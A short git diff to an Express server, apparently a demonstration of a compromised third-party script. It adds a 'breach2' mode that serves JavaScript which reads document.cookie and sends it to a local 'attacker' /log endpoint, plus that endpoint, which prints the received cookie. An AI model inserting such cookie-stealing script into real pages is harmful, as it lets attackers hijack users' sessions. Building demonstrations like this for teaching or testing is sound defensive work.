@@ -28,8 +28,22 @@ app.get("/weather.js", (req, res) => {
             document.getElementById('username').innerText)`);
     }
 
+    else if (mode === "breach2") {
+        res.type("text/javascript").send(
+            "const stolenCookie = document.cookie;" +
+            "fetch(`http://localhost:5000/log?data=${stolenCookie}`);" +
+            "console.log('Cookie successfully sent to Attacker Server!');");
+    }
+
     else res.sendFile(path.join(__dirname, "weather.js"));
 });
+
+
+app.get("/log", (req, res) => {
+    const cookie = req.query.data;
+    if (cookie) res.send(console.log("Getting cookie...", cookie));
+    else res.status(404).send(console.log("I don't see any cookie..."));
+}); // IT CAN BE BLOCKED BY ADBLOCK........
 
 app.listen(PORT, () => {
     console.log(`[System] Server started in mode "${mode}" on port ${PORT}.`);
